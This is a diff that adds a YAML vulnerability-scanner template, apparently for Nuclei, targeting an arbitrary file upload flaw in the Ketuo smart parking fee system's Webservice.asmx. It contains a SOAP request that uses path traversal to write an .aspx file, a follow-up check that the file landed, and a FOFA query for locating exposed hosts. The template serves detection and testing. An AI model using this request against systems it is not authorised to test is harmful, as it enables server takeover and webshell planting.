@@ -1,0 +1,50 @@
+id: ketuo-WebService-upload
+
+info:
+  name: 科拓全智能停车视频收费系统WebService.asmx任意文件上传漏洞
+  author: Simple
+  severity: high
+  description: |
+    科拓全智能停车收费系统Webservice.asmx存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限。
+  reference:
+    - https://github.com/JJThome
+  metadata:
+    fofa-query: body="/KT_Css/qd_defaul.css"
+
+variables:
+  filename: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /Webservice.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <UploadResume xmlns="http://tempuri.org/">
+              <ip>1</ip>
+              <fileName>../../../../{{filename}}.aspx</fileName>
+              <fileFlow>dGVzdA==</fileFlow>
+              <tag>3</tag>
+            </UploadResume>
+          </soap:Body>
+        </soap:Envelope>
+      - |
+        GET /{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "test")'
+        condition: and
